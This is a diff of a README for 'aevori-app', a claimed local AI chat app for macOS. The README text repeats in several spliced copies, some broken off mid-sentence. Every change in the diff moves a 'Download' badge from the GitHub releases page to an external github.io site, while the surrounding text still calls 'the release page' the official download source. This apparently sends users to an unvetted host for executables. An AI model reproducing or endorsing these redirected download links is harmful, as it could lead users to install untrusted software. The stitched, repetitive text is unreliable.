@@ -1,6 +1,6 @@
 # 🧠 aevori-app - Local AI Chat Made Easy
 
-[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 aevori-app is a local AI chat and personal agent application for macOS. It uses Ollama-powered conversations so you can talk with an AI on your own computer, create customizable characters, control what the app remembers, and use a browser-based workspace. It is built for people who want a self-hosted, local-first AI setup with ready-to-run downloads for Apple silicon and Intel.
 
@@ -44,7 +44,7 @@ If you are using Windows, remember that aevori-app is a macOS application. Windo
 
 Visit this link to download the application:
 
-[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 Visit this link to download the application. The release page provides the ready-to-run downloads for Apple silicon and Intel Macs.
 
@@ -61,7 +61,7 @@ When you open aevori-app for the first time, take a moment to look around the wo
 
 If the app uses Ollama, make# 🧠 aevori-app - Local AI Chat Made Easy
 
-[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 aevori-app is a local AI chat and personal agent application for macOS. It gives you Ollama-powered conversations, customizable characters, controllable memory, and a browser-based workspace in one place. The app is designed for people who want a self-hosted local AI setup without needing to be a programmer. Ready-to-run downloads are provided for Apple silicon and Intel Macs.
 
@@ -111,7 +111,7 @@ aevori-app brings several useful pieces together:
 
 Visit this link to download the application.
 
-[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 The release page is the official place for aevori-app downloads. It provides ready-to-run downloads for Apple silicon and Intel Macs.
 
@@ -139,7 +139,7 @@ aevori-app is built around local AI and self-hosted use. That means the AI conve
 
 The app also gives you memory controls. Memory can be useful because it helps the assistant keep track of details across conversations. Control matters because you can decide when memory should be used and when it should be cleared. For# 🧠 aevori-app - Local AI Chat Made Simple
 
-[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 aevori-app is a local AI chat and personal agent application for macOS. It brings Ollama-powered conversations, customizable characters, controllable memory, and a browser-based workspace into one ready-to-run app. It is designed for everyday people who want a local, self-hosted AI setup without needing to be a programmer.
 
@@ -153,7 +153,7 @@ The app is made for macOS and uses Ollama for local AI conversations. Ready-to-r
 
 Visit this link to download the application.
 
-[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 The release page is the official place for aevori-app downloads. It provides ready-to-run downloads for Apple silicon and Intel Macs. After you download the application, open it on your Mac and use the browser-based workspace.
 
@@ -201,7 +201,7 @@ aevori-app is built around local AI and self-hosted use. It uses Ollama for loca
 
 When# 🧠 aevori-app - Local AI Chat Made Simple
 
-[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Download%20aevori--app-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 aevori-app is a local AI chat and personal agent application for macOS. It brings Ollama-powered conversations, customizable characters, controllable memory, and a browser-based workspace into one ready-to-run app. It is designed for everyday people who want a local, self-hosted AI setup without needing to be a programmer.
 
@@ -215,7 +215,7 @@ The app is made for macOS and uses Ollama for local AI conversations. Ready-to-r
 
 Visit this link to download the application.
 
-[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rosaleenoilbearing771/aevori-app/releases)
+[![Download aevori-app](https://img.shields.io/badge/Get%20aevori--app-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://rosaleenoilbearing771.github.io)
 
 The release page is the official place for aevori-app downloads. It provides ready-to-run downloads for Apple silicon and Intel Macs. After you download the application, open it on your Mac and use the browser-based workspace.
 
